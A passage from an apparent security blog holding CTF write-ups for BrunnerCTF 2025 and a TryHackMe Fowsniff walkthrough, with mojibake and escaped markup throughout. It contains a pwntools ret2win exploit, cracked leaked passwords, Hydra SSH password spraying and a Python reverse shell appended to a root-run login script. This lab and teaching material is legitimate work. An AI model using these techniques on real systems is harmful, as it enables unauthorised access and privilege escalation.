\u0026ndash;ssl dat-overflow-dough-b9ac089d9249f9ee.challs.brunnerne.xyz 443\nReading the Challenge # The description hinted at something familiar in binary exploitation:\n\u0026quot;Intern wrote C code using unsafe functions... accidentally pushed to production... could leak our secret recipe.\u0026quot;\nTranslation? Somewhere in the binary, there's a buffer overflow â€\u0026quot; most likely caused by using gets() or similar unsafe functions. Perfect for a ret2func exploit.\nInspecting the Source Code # The provided recipe.c code snippet showed this:\nvoid vulnerable_dough_recipe() { char recipe[16]; puts(\u0026#34;Please enter the name of the recipe you want to retrieve:\u0026#34;); gets(recipe); // âš ï¸ Dangerous! No length check } Key things to note:\nBuffer size is 16 bytes. Uses gets(), which doesnâ€™t stop reading, allowing overflow. Thereâ€™s a hidden function: void secret_dough_recipe(void) { int fd = open(\u0026#34;flag.txt\u0026#34;, O_RDONLY); sendfile(1, fd, NULL, 100); } If we overwrite the return address to point to this function, weâ€™ll get the flag.\nStatic Binary Analysis # Before writing an exploit, I checked protections:\n$ checksec recipe Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) NX enabled â†\u0026rsquo; we canâ€™t inject shellcode, but we can reuse code (return-to-function). No PIE â†\u0026rsquo; function addresses donâ€™t change between runs. No canary â†\u0026rsquo; no stack protections to bypass. This screamed classic ret2win.\nFinding the Offset # From the source:\nBuffer size: 16 bytes Saved RBP: 8 bytes Return address overwrite begins after 16 + 8 = 24 bytes. Writing the Exploit # Hereâ€™s the final Python exploit with pwntools:\n#!/usr/bin/env python3 from pwn import * import argparse RECIPE_BUFFER_SIZE = 16 RBP_SIZE = 8 PROMPT = \u0026#34;Please enter the name of the recipe you want to retrieve:\u0026#34; parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;--remote\u0026#34;, help=\u0026#34;remote target in form host:port\u0026#34;, default=None) args = parser.parse_args() e = ELF(\u0026#34;./recipe\u0026#34;) if args.remote: host, port = args.remote.split(\u0026#34;:\u0026#34;) port = int(port) io = remote(host, port, ssl=True) SECRET_ADDRESS = e.symbols[\u0026#39;secret_dough_recipe\u0026#39;] else: io = e.process() SECRET_ADDRESS = e.symbols[\u0026#39;secret_dough_recipe\u0026#39;] log.info(f\u0026#34;Using secret address: {hex(SECRET_ADDRESS)}\u0026#34;) payload = b\u0026#34;A\u0026#34; * RECIPE_BUFFER_SIZE payload += b\u0026#34;B\u0026#34; * RBP_SIZE payload += p64(SECRET_ADDRESS) io.recvuntil(PROMPT.encode()) io.sendline(payload) io.interactive() Exploiting the Remote Service # With everything ready, I ran:\npython3 exploits.py --remote dat-overflow-dough-b9ac089d9249f9ee.challs.brunnerne.xyz:443 Output:\n[*] Using secret address: 0x4011b6 [*] Switching to interactive mode brunner{b1n4ry_eXpLoiTatioN_iS_CooL} Success â€\u0026quot; we hijacked the return pointer and jumped straight into the secret_dough_recipe function, printing the flag. Flag: brunner{b1n4ry_eXpLoiTatioN_iS_CooL}\nBaker Brian - reverse engineering # This was the challenge description: Notice that we need to download the file attached and also connect to the challenge. I downloaded the zip file, unzipped it and found the python script below:\ncat auth.py print(\u0026#34;\u0026#34;\u0026#34; ðŸŽ‚ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸŽ‚ ðŸ° ðŸ° ðŸ° Baker Brian\u0026#39;s Cake Vault ðŸ° ðŸ° ðŸ° ðŸŽ‚ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸ°ðŸŽ‚ \u0026#34;\u0026#34;\u0026#34;) # Make sure nobody else tries to enter my vault username = input(\u0026#34;Enter Username:\\n\u0026gt; \u0026#34;) if username != \u0026#34;Br14n_th3_b3st_c4k3_b4k3r\u0026#34;: print(\u0026#34;âŒ Go away, only Baker Brian has access!\u0026#34;) exit() # Password check if anybody guesses my username # Naturally complies with all modern standards, nothing weak like \u0026#34;Tr0ub4dor\u0026amp;3\u0026#34; password = input(\u0026#34;\\nEnter password:\\n\u0026gt; \u0026#34;) # Check each word separately words = password.split(\u0026#34;-\u0026#34;) # Word 1 if not ( len(words) \u0026gt; 0 and words[0] == \u0026#34;red\u0026#34; ): print(\u0026#34;âŒ Word 1: Wrong - get out!\u0026#34;) exit() else: print(\u0026#34;âœ… Word 1: Correct!\u0026#34;) # Word 2 if not ( len(words) \u0026gt; 1 and words[1][::-1] == \u0026#34;yromem\u0026#34; ): print(\u0026#34;âŒ Word 2: Wrong - get out!\u0026#34;) exit() else: print(\u0026#34;âœ… Word 2: Correct!\u0026#34;) # Word 3 if not ( len(words) \u0026gt; 2 and len(words[2]) == 5 and words[2][0] == \u0026#34;b\u0026#34; and words[2][1] == \u0026#34;e\u0026#34; and words[2][2:4] == \u0026#34;r\u0026#34; * 2 and words[2][-1] == words[1][-1] ): print(\u0026#34;âŒ Word 3: Wrong - get out!\u0026#34;) exit() else: print(\u0026#34;âœ… Word 3: Correct!\u0026#34;) # Word 4 if not ( len(words) \u0026gt; 3 and words[3] == words[0][:2] + words[1][:3] + words[2][:3] ): print(\u0026#34;âŒ Word 4: Wrong - get out!\u0026#34;) exit() else: print(\u0026#34;âœ… Word 4: Correct!\u0026#34;) # Password length if len(password) != len(username): print(\u0026#34;âŒ Wrong password length, get out!\u0026#34;) exit() # Nobody will crack that password, access can be granted print(\u0026#34;\\nWelcome back, Brian! Your vault has been opened:\\n\u0026#34;) with open(\u0026#34;cake_vault.txt\u0026#34;) as f: print(f.read()) When I connected to the challenge, I was prompted to give a username, so I went back to the script and read it to find a hardcoded username: Br14n_th3_b3st_c4k3_b4k3r. On pressing enter, I was asked for a password.\nFrom the script, we note that the password is split by hyphens into 4 words:\nwords = password.split(\u0026#34;-\u0026#34;) So the format is: word1-word2-word3-word4\nWord 1 Analysis # if not ( len(words) \u0026gt; 0 and words[0] == \u0026#34;red\u0026#34; # Direct comparison ): âœ… Word 1 = red (exact match required)\nWord 2 Analysis # if not ( len(words) \u0026gt; 1 and words[1][::-1] == \u0026#34;yromem\u0026#34; # Reverse of word2 should equal \u0026#34;yromem\u0026#34; ): Reverse \u0026#34;yromem\u0026#34; = \u0026#34;memory\u0026#34; (Python string reversal: [::-1]) âœ… Word 2 = memory\nWord 3 Analysis (Most Complex) # if not ( len(words) \u0026gt; 2 and len(words[2]) == 5 and # Must be 5 characters long words[2][0] == \u0026#34;b\u0026#34; and # 1st character: \u0026#39;b\u0026#39; words[2][1] == \u0026#34;e\u0026#34; and # 2nd character: \u0026#39;e\u0026#39; words[2][2:4] == \u0026#34;r\u0026#34; * 2 and # Characters 2-3 (index 2 \u0026amp; 3): \u0026#34;rr\u0026#34; words[2][-1] == words[1][-1] # Last character equals last char of word2 ): Let\u0026rsquo;s break this down:\nLength must be 5: _ _ _ _ _ Position 0: b â†\u0026rsquo; b_ _ _ _ Position 1: e â†\u0026rsquo; be_ _ _ Positions 2-3: rr â†\u0026rsquo; berr_ Position 4 (last char): must equal last char of word2 (\u0026ldquo;memory\u0026rdquo; â†\u0026rsquo; \u0026lsquo;y\u0026rsquo;) â†\u0026rsquo; berry âœ… Word 3 = berry\nWord 4 Analysis # if not ( len(words) \u0026gt; 3 and words[3] == words[0][:2] + words[1][:3] + words[2][:3] ): Break down the concatenation:\nwords[0][:2] = First 2 chars of \u0026ldquo;red\u0026rdquo; â†\u0026rsquo; \u0026ldquo;re\u0026rdquo; words[1][:3] = First 3 chars of \u0026ldquo;memory\u0026rdquo; â†\u0026rsquo; \u0026ldquo;mem\u0026rdquo; words[2][:3] = First 3 chars of \u0026ldquo;berry\u0026rdquo; â†\u0026rsquo; \u0026ldquo;ber\u0026rdquo; Combine: \u0026ldquo;re\u0026rdquo; + \u0026ldquo;mem\u0026rdquo; + \u0026ldquo;ber\u0026rdquo; = \u0026ldquo;remember\u0026rdquo;\nâœ… Word 4 = remember\nFinal Password Construction # Combine all words with hyphens:\nWord 1: red\nWord 2: memory\nWord 3: berry\nWord 4: remember\nâœ… Password = red-memory-berry-remember\nI then keyed this in and got the flag: Rolling Pin - reverse engineering # Challenge description: File: rolling_pin (64-bit ELF)\nRecon (Understanding the Binary) # First, check what kind of file weâ€™re dealing with:\nfile rolling_pin Output: ELF 64-bit LSB executable, x86-64, dynamically linked, ...\nCool â€\u0026quot; itâ€™s a 64-bit Linux executable.\nLoad it into radare2 # We open the file in analysis mode:\nr2 -AA rolling_pin Find the main function:\nafl | grep main s main pdf This shows the main logic where the binary checks your input.\nLook for Strings # Check for readable strings:\niz Found:\nGood job! Try again! This tells us where the program decides if your input is correct or wrong.\nLook at the Data # We inspect memory regions near where the program compares inputs:\npx 32 @ 0x00402010 Output:\n62e4 d573 e6ac 9cbd 7260 d1a1 4766 d73a 6866 7d23 03ae d934 7d52 6f6c 6c20 7468 This is the scrambled flag.\nUnderstand the Logic # By reading the disassembly, we see the binary:\nTakes your input. Rotates each byte to the left by a position based on its index. Compares it to the scrambled bytes. So, to reverse it, we rotate right instead of left.\nWrite the Decoder # A simple Python script to reverse the rotation:\ndata = [0x62, 0xe4, 0xd5, 0x73, 0xe6, 0xac, 0x9c, 0xbd, 0x72, 0x60, 0xd1, 0xa1, 0x47, 0x66, 0xd7, 0x3a, 0x68, 0x66, 0x7d, 0x23, 0x03, 0xae, 0xd9, 0x34, 0x7d] flag = \u0026#34;\u0026#34; for i, byte in enumerate(data): shift = i \u0026amp; 7 # same shift as program but right instead of left flag += chr(((byte \u0026gt;\u0026gt; shift) | (byte \u0026lt;\u0026lt; (8 - shift))) \u0026amp; 0xFF) print(flag) Running it gives:brunner{r0t4t3_th3_d0ugh}\nTest the Flag # Feed it into the binary:\necho \u0026#34;brunner{r0t4t3_th3_d0ugh}\u0026#34; | ./rolling_pin Output:Good job!\nWhere Robots Cannot Search - web # Looking at the Chall decription, this hints us to robots.txt: So I started the challenge and visited the website, appending the /robots.txt extension at the end of the URL and discovered some interesting dissallowed entries: One of them was the flag.txt file as highlighted above and when I tried to read it, I found the flag: Flag: brunner{r0bot5_sh0u1d_nOt_637_h3re_b0t_You_g07_h3re}\nCookie Jar - web # I opened the challenge description and it looked and sounded like this was a cookie manipulation challenge: When I started the challenge and visited the website, I found out that there is a cookie recipe only accessible to premium users. So I inspected the page and looked at the cookies to see what I can find: Noticing that the cookie value for isPremium has been set to false, I changed the value to true and refresehed the page. That gave me the flag for this challenge: Flag: brunner{C00k135_4R3_p0W3rFu1_4nD_D3l1c10u5!}\nCoffee (User) - boot2root # This was the challenge description. The challenge required us to obtain the user.txt file: I visited the target and found an ordering management system and started testing it\u0026rsquo;s functionality: Keying in a number as an order ID like 1, gives us the order status as shown above. After testing for multiple vulnerabilities on that fiels, I realized its vulnerable to Command Injection a illustrated below:\nThis then helped me read the file we are supposed to read for the challenge: Flag: brunner{C0Ff33_w1Th_4_51d3_0F_c0MM4nD_1nj3Ct10n!}\nCaffeine (Root) - boot2root # This is a continuation of the Caffeine (User) challenge. Here is its description: Looks like our goal this time is to escalate privileges and get the root flag. Once again, I visit the challenge page and start to do further enumeration as we had earlier discovered command injection vulnerability on the website: As shown above, I ran sudo -l and discovered that our current context user has the ability to run the brew binary with elevated privileges without a need for a password. However I didnt know what that binary is used for, so I tried to read its help menu and didn\u0026rsquo;t get anything useful, apart from what seemed like it expected a file as an argument: I therefore went ahead and supplied the file name of the file we are required to read as the argument and that gave me the flag: flag: brunner{5uD0_pR1V1L3g35_T00_h0t_F0r_J4v4_J4CK!}\nWrapping up, BrunnerCTF 2025 was a fun and insightful experience that sharpened my problem-solving skills and deepened my understanding of core cybersecurity concepts. The â€œShake \u0026amp; Bakeâ€ challenges were perfect for practicing fundamentals while still offering a few clever twists to keep things exciting. Iâ€™m looking forward to tackling more advanced challenges next time and continuing to refine my skills. Until then â€\u0026quot; happy hacking, and see you in the next CTF!\n","date":"24 August 2025","externalUrl":null,"permalink":"/posts/2025-08-24-brunnerctf.md/2025-08-24-brunnerctf/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eCooking Flags with BrunnerCTF 2025 - A Beginnerâ€™s Feast \n    \u003cdiv id=\"cooking-flags-with-brunnerctf-2025---a-beginnerâs-feast\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#cooking-flags-with-brunnerctf-2025---a-beginner%c3%a2s-feast\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cp\u003eGet your aprons on and terminals ready - the BrunnerCTF has just served up its very first edition, and I couldnâ€™t resist grabbing a plate! ðŸ½ï¸\u003c/p\u003e\n\u003cp\u003eThis CTF brought a flavorful mix of challenges, from web and OSINT to forensics, crypto, reverse engineering, and even some pwn and boot2root fun. While there were plenty of spicy dishes for the seasoned pros, I stuck to the â€œShake \u0026amp; Bakeâ€ menu - a perfect selection of beginner-friendly challenges designed to teach and entertain.\u003c/p\u003e","title":"Brunner CTF","type":"posts"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/burpsuite/","section":"Categories","summary":"","title":"Burpsuite","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/burpsuite/","section":"Tags","summary":"","title":"Burpsuite","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/crypto/","section":"Categories","summary":"","title":"Crypto","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/easy/","section":"Categories","summary":"","title":"Easy","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/forensics/","section":"Categories","summary":"","title":"Forensics","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/forensics/","section":"Tags","summary":"","title":"Forensics","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/misc/","section":"Categories","summary":"","title":"Misc","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/osint/","section":"Categories","summary":"","title":"Osint","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"Pwn","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"Pwn","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/reverse-engineering/","section":"Categories","summary":"","title":"Reverse Engineering","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/reverse-engineering/","section":"Tags","summary":"","title":"Reverse Engineering","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/sqli/","section":"Categories","summary":"","title":"SQLi","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/sqli/","section":"Tags","summary":"","title":"SQLi","type":"tags"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/categories/sqlmap/","section":"Categories","summary":"","title":"SQLMAP","type":"categories"},{"content":"","date":"24 August 2025","externalUrl":null,"permalink":"/tags/sqlmap/","section":"Tags","summary":"","title":"SQLMAP","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/email-enumeration/","section":"Tags","summary":"","title":"Email Enumeration","type":"tags"},{"content":" Fowsniff CTF - Complete Beginner\u0026rsquo;s Walkthrough # What is This? # Fowsniff is a beginner-friendly boot2root CTF (Capture The Flag) challenge hosted on TryHackMe. In this challenge, we\u0026rsquo;ll learn fundamental penetration testing skills by exploiting a vulnerable Linux machine to gain root access and capture the flag.\nWhat you\u0026rsquo;ll learn:\nNetwork scanning with Nmap Online research and Google dorking Hash cracking techniques Email protocol exploitation (POP3) SSH brute forcing Linux privilege escalation Reverse shell creation Prerequisites # Basic Linux command line knowledge A TryHackMe account (free) Kali Linux or similar penetration testing environment Basic understanding of IP addresses and ports Lab Setup # Starting the Machine # Log into your TryHackMe account Navigate to the Fowsniff CTF room Click \u0026ldquo;Start Machine\u0026rdquo; and wait for it to deploy Note the IP address assigned to your target machine (we\u0026rsquo;ll use 10.10.4.101 in this example) Phase 1: Reconnaissance \u0026amp; Enumeration # What is Reconnaissance? # Reconnaissance (or \u0026ldquo;recon\u0026rdquo;) is the process of gathering information about our target. We want to find:\nWhat services are running? What ports are open? What software versions are installed? Any publicly available information about the target? Step 1: Network Scanning with Nmap # What is Nmap? Nmap (Network Mapper) is a tool that scans networks to discover hosts and services. It\u0026rsquo;s like knocking on doors to see which ones are open.\nLet\u0026rsquo;s scan our target for open ports and services:\nnmap -sV -p- 10.10.4.101 -T4 Command breakdown:\nnmap - The network scanning tool -sV - Version detection (tells us what software is running) -p- - Scan all 65,535 ports (not just common ones) 10.10.4.101 - Our target IP address -T4 - Timing template (faster scanning) Output:\nStarting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 03:31 BST Nmap scan report for ip-10-10-4-101.eu-west-1.compute.internal (10.10.4.101) Host is up (0.00044s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd MAC Address: 02:F8:7E:ED:14:65 (Unknown) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds What we discovered:\nPort 22 (SSH) - Secure Shell for remote login Port 80 (HTTP) - Web server running Apache Port 110 (POP3) - Email retrieval protocol Port 143 (IMAP) - Another email protocol Operating System: Ubuntu Linux Step 2: Web Application Investigation # Let\u0026rsquo;s check the website first. Open a web browser and navigate to:\nhttp://10.10.4.101 You should see a website that appears to be temporarily unavailable or under maintenance.\nWhat is Directory Fuzzing? Sometimes websites have hidden directories that aren\u0026rsquo;t linked from the main page. We can try to find these using a technique called \u0026ldquo;fuzzing\u0026rdquo; - essentially guessing common directory names.\nLet\u0026rsquo;s try directory fuzzing (this won\u0026rsquo;t find much, but it\u0026rsquo;s good practice):\nffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.4.101/FUZZ Command breakdown:\nffuf - Fast web fuzzer -w - Wordlist to use for fuzzing -u - URL pattern (FUZZ gets replaced with words from the wordlist) Note: If you don\u0026rsquo;t have ffuf installed, install it with: sudo apt install ffuf\nPhase 2: OSINT (Open Source Intelligence) # What is OSINT? # OSINT involves gathering information from publicly available sources. Sometimes, information about our target is already available online!\nStep 3: Google Dorking Discovery # Since the website seems to be down for maintenance, let\u0026rsquo;s try searching online for information about \u0026ldquo;Fowsniff\u0026rdquo; or the company.\nWhat is Google Dorking? Google dorking uses special search operators to find specific information that might not appear in normal searches.\nIn a real scenario, you might search for:\nCompany name + \u0026ldquo;password\u0026rdquo; Company domain + \u0026ldquo;leak\u0026rdquo; Employee email addresses For this CTF, the hint leads us to a GitHub repository: https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt\nThis simulates finding a data breach dump online. Let\u0026rsquo;s examine what we found:\nStep 4: Analyzing the Password Dump # The GitHub link contains leaked user credentials in this format:\nusername@domain:password_hash Our discovered data:\nmauer@fowsniff:8a28a94a588a95b80163709ab4313aa4 mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 tegel@fowsniff:1dc352435fecca338acfd4be10984009 baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb seina@fowsniff:90dc16d47114aa13671c697fd506cf26 stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11 sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e What are these hashes? The long strings after the colons are password hashes. Instead of storing passwords in plain text (which would be very insecure), systems store mathematical representations called \u0026ldquo;hashes.\u0026rdquo;\nStep 5: Cracking Password Hashes # What is Hash Cracking? We need to reverse these hashes back to the original passwords. We can use online tools or offline tools like hashcat or john.\nLet\u0026rsquo;s use the online tool CrackStation (https://crackstation.net):\nCopy all the hashes (the part after the colon) Paste them into CrackStation Solve the captcha and click \u0026ldquo;Crack Hashes\u0026rdquo; Our cracked credentials:\nmauer@fowsniff:mailcall mustikka@fowsniff:bilbo101 tegel@fowsniff:apples01 baksteen@fowsniff:skyler22 seina@fowsniff:scoobydoo2 stone@fowsniff:[not cracked] mursten@fowsniff:carp4ever parede@fowsniff:orlando12 sciana@fowsniff:07011972 Let\u0026rsquo;s save these in two files for later use:\n# Create a usernames file echo -e \u0026#34;mauer\\nmustikka\\ntegel\\nbaksteen\\nseina\\nstone\\nmursten\\nparede\\nsciana\u0026#34; \u0026gt; fowsniff_usernames.txt # Create a passwords file echo -e \u0026#34;mailcall\\nbilbo101\\napples01\\nskyler22\\nscoobydoo2\\ncarp4ever\\norlando12\\n07011972\u0026#34; \u0026gt; fowsniff_passwords.txt Phase 3: Email Protocol Exploitation # What is POP3? # POP3 (Post Office Protocol 3) is an email protocol that allows email clients to retrieve emails from a mail server. Unlike IMAP, POP3 typically downloads emails to the client and removes them from the server.\nRemember our Nmap scan found POP3 running on port 110. Let\u0026rsquo;s try to access someone\u0026rsquo;s email account!\nStep 6: Connecting to the POP3 Service # What is Netcat? Netcat (nc) is a networking utility that can connect to any port. It\u0026rsquo;s like a Swiss Army knife for network connections.\nLet\u0026rsquo;s try connecting to the POP3 service with one of our cracked accounts:\nnc 10.10.4.101 110 You should see:\n+OK Welcome to the Fowsniff Corporate Mail Server! Now let\u0026rsquo;s try logging in as seina with password scoobydoo2:\nUSER seina +OK PASS scoobydoo2 +OK Logged in. Great! We\u0026rsquo;re in. Let\u0026rsquo;s see what emails are available:\nLIST +OK 2 messages: 1 1622 2 1280 . This shows there are 2 emails. Let\u0026rsquo;s read the first one:\nRETR 1 Important Email Content:\nSubject: URGENT! Security EVENT! From: stone@fowsniff (stone) Dear All, A few days ago, a malicious actor was able to gain entry to our internal email systems. The attacker was able to exploit incorrectly filtered escape characters within our SQL database to access our login credentials. Both the SQL and authentication system used legacy methods that had not been updated in some time. We have been instructed to perform a complete internal system overhaul. While the main systems are \u0026#34;in the shop,\u0026#34; we have moved to this isolated, temporary server that has minimal functionality. This server is capable of sending and receiving emails, but only locally. That means you can only send emails to other users, not to the world wide web. You can, however, access this system via the SSH protocol. The temporary password for SSH is \u0026#34;S1ck3nBluff+secureshell\u0026#34; You MUST change this password as soon as possible, and you will do so under my guidance. I saw the leak the attacker posted online, and I must say that your passwords were not very secure. Come see me in my office at your earliest convenience and we\u0026#39;ll set it up. Thanks, A.J Stone Key Discovery: We found a temporary SSH password: S1ck3nBluff+secureshell\nType QUIT to exit the POP3 session.\nPhase 4: SSH Access # What is SSH? # SSH (Secure Shell) is a protocol for securely connecting to remote computers. It\u0026rsquo;s like remote desktop, but command-line based.\nStep 7: Finding Who Still Uses the Default Password # The email mentioned that everyone should change their SSH password. Let\u0026rsquo;s see who hasn\u0026rsquo;t changed it yet using Hydra.\nWhat is Hydra? Hydra is a brute-force tool that tries multiple username/password combinations against various services.\nInstall Hydra if you don\u0026rsquo;t have it:\nsudo apt install hydra Let\u0026rsquo;s test the default SSH password against all usernames:\nhydra -L fowsniff_usernames.txt -p \u0026#39;S1ck3nBluff+secureshell\u0026#39; ssh://10.10.4.101 Command breakdown:\nhydra - The brute force tool -L - File containing usernames to try -p - Single password to test (note the quotes due to special characters) ssh://10.10.4.101 - Target service and IP Output:\nHydra v9.0 (c) 2019 by van Hauser/THC [DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task [DATA] attacking ssh://10.10.4.101:22/ [22][ssh] host: 10.10.4.101 login: baksteen password: S1ck3nBluff+secureshell 1 of 1 target successfully completed, 1 valid password found Excellent! User baksteen hasn\u0026rsquo;t changed their password yet.\nStep 8: SSH Connection # Let\u0026rsquo;s connect via SSH:\nssh baksteen@10.10.4.101 Enter the password when prompted: S1ck3nBluff+secureshell\nSSH Session Output:\n_____ _ __ __ :sdddddddddddddddy+ | ___|____ _____ _ __ (_)/ _|/ _| :yNMMMMMMMMMMMMMNmhsso | |_ / _ \\ \\ /\\ / / __| \u0026#39;_ \\| | |_| |_ .sdmmmmmNmmmmmmmNdyssssso | _| (_) \\ V V /\\__ \\ | | | | _| _| -: y. dssssssso |_| \\___/ \\_/\\_/ |___/_| |_|_|_| |_| -: y. dssssssso ____ -: y. dssssssso / ___|___ _ __ _ __ -: y. dssssssso | | / _ \\| \u0026#39;__| \u0026#39;_ \\ -: o. dssssssso | |__| (_) | | | |_) | _ -: o. yssssssso \\____\\___/|_| | .__/ (_) -: .+mdddddddmyyyyyhy: |_| -: -odMMMMMMMMMMmhhdy/. .ohdddddddddddddho: Delivering Solutions **** Welcome to the Fowsniff Corporate Server! **** ---------- NOTICE: ---------- * Due to the recent security breach, we are running on a very minimal system. * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords. baksteen@fowsniff:~$ We\u0026rsquo;re in! Let\u0026rsquo;s explore:\npwd ls -la Output:\n/home/baksteen total 20 drwxr-xr-x 4 baksteen baksteen 4096 Mar 13 2018 . drwxr-xr-x 4 root root 4096 Mar 9 2018 .. -rw-r--r-- 1 baksteen baksteen 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 baksteen baksteen 3771 Sep 1 2015 .bashrc drwx------ 2 baksteen baksteen 4096 Mar 13 2018 .cache drwxr-xr-x 5 baksteen baksteen 4096 Mar 13 2018 Maildir -rw-r--r-- 1 baksteen baksteen 655 May 16 2017 .profile -rw-r--r-- 1 baksteen baksteen 78 Mar 13 2018 term.txt Let\u0026rsquo;s check the user flag:\ncat term.txt This isn\u0026rsquo;t the main flag - we need to escalate to root privileges.\nPhase 5: Privilege Escalation # What is Privilege Escalation? # Privilege escalation is the process of gaining higher-level permissions on a system. We currently have access as the user baksteen, but we want root access to get the final flag.\nStep 9: System Enumeration with LinPEAS # What is LinPEAS? LinPEAS (Linux Privilege Escalation Awesome Script) is an automated tool that scans for common privilege escalation vectors on Linux systems.\nLet\u0026rsquo;s download and run LinPEAS:\n# Download LinPEAS to the target machine curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh # Make it executable chmod +x linpeas.sh # Run it ./linpeas.sh Alternative download method if curl doesn\u0026rsquo;t work:\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh Key Finding from LinPEAS:\nInteresting GROUP writable files (not in Home) (max 200) Group users: /opt/cube/cube.sh This is interesting! Let\u0026rsquo;s investigate this file.\nStep 10: Analyzing the Writable Script # ls -la /opt/cube/cube.sh Output:\n-rw-rwxr-- 1 parede users 851 Mar 11 2018 /opt/cube/cube.sh Understanding File Permissions:\nrw- (owner: parede) - Read and write permissions rwx (group: users) - Read, write, and execute permissions r-- (others) - Read only Why is this important?\nWe are part of the users group The users group has write access to this script This script likely runs with elevated privileges Let\u0026rsquo;s see what this script does:\ncat /opt/cube/cube.sh This script appears to generate the banner we saw when logging in via SSH. If it runs as root during login, we can modify it to give us a root shell!\nStep 11: Creating a Reverse Shell # What is a Reverse Shell? A reverse shell is when the target machine connects back to our attacking machine, giving us a command prompt. This is useful because:\nIt bypasses firewall restrictions We can catch it with a simple listener If the script runs as root, we get a root shell First, let\u0026rsquo;s set up a listener on our attacking machine (in a new terminal):\nnc -lvnp 4444 Command breakdown:\nnc - Netcat -l - Listen mode -v - Verbose output -n - Don\u0026rsquo;t resolve hostnames -p 4444 - Listen on port 4444 Now, let\u0026rsquo;s modify the script to include our reverse shell. We need to add a Python reverse shell to the script:\n# First, let\u0026#39;s backup the original script cp /opt/cube/cube.sh /opt/cube/cube.sh.backup # Add our reverse shell to the script (replace 10.9.x.x with YOUR IP) echo \u0026#39;python3 -c \u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.9.x.x\\\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#34;\u0026#39; \u0026gt;\u0026gt; /opt/cube/cube.sh To find your IP address (attacking machine):\nip addr show tun0 # or ifconfig tun0 Look for your TryHackMe VPN IP address (usually starts with 10.x.x.x).\nStep 12: Triggering the Reverse Shell # The script runs when someone logs in via SSH. Let\u0026rsquo;s trigger it by opening a new SSH session to the same machine:\n# In a new terminal, SSH again ssh baksteen@10.10.4.101 Check your netcat listener - you should see a connection!\nExample successful connection:\nListening on 0.0.0.0 4444 Connection received on 10.10.4.101 45944 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # whoami root # Congratulations! You now have root access!\nStep 13: Capturing the Flag # # Find the flag find / -name 